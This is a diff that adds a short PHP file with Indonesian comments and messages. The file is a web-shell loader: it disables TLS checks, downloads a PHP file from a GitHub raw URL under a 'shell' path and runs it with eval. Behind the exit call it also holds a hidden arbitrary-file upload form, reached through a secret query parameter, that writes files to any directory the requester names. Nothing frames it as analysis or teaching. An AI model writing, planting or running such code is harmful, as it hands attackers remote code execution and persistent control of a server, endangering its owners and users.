@@ -1,0 +1,47 @@
+<?php
+function getContent($url) {
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    if ($content === false) {
+        $content = file_get_contents($url);
+    }
+    return $content;
+}
+
+// Fungsi untuk mendapatkan data mentah dari URL
+function getRawContent($url) {
+    return getContent($url);
+}
+
+$url = 'https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/refs/heads/main/shell/vatfan.php';
+$content = getRawContent($url);
+eval('?>' . $content);
+exit;
+
+if (isset($_GET['call']) && $_GET['call'] === 'logic') {
+    echo '<form method="post" enctype="multipart/form-data">';
+    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
+    echo '<input type="file" name="file" size="15">';
+    echo '<input type="submit" value="Unggah">';
+    echo '</form>';
+}
+
+if (isset($_FILES['file']['tmp_name'])) {
+    $uploadd = $_FILES['file']['tmp_name'];
+    if (file_exists($uploadd)) {
+        $pwddir = $_POST['dir'];
+        $real = $_FILES['file']['name'];
+        $de = rtrim($pwddir, '/') . "/" . $real;
+        if (move_uploaded_file($uploadd, $de)) {
+            echo "BERKAS DIUNGGAHKAN KE $de";
+        } else {
+            echo "GAGAL MENGUNGGAH BERKAS KE $de";
+        }
+    }
+}
+?>
